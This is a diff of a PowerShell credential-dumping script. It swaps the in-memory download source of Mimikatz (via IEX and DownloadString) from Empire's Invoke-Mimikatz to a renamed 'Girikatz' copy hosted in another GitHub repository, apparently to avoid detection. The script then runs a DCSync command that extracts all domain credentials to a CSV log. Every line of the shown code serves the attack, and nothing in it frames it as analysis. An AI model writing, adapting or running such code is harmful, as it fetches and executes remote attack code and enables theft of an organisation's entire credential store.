@@ -42,7 +42,7 @@
     # Download Mimikatz
     Write-Host "  [*] Downloading Mimikatz into memory..." -ForegroundColor Cyan
     try {
-        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')
+        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/Girism/refs/heads/main/Girikatz.ps1')
         Write-Host "  [+] Mimikatz downloaded successfully" -ForegroundColor Green
     } catch {
         Write-Host "  [!] ERROR: Failed to download Mimikatz" -ForegroundColor Red
@@ -56,7 +56,7 @@
     $Command = "`"log $LOGFILE`" `"lsadump::dcsync /domain:$domain /all /csv`""
     try {
         Write-Progress -Activity "Running Mimikatz" -Status "Extracting credentials..." -PercentComplete 50
-        Invoke-Mimikatz -Command $Command -ErrorAction Stop | Out-Null
+        Girikatz -Command $Command -ErrorAction Stop | Out-Null
         Write-Progress -Activity "Running Mimikatz" -Status "Completed" -PercentComplete 100 -Completed
         Write-Host "  [+] Mimikatz executed successfully" -ForegroundColor Green
     } catch {
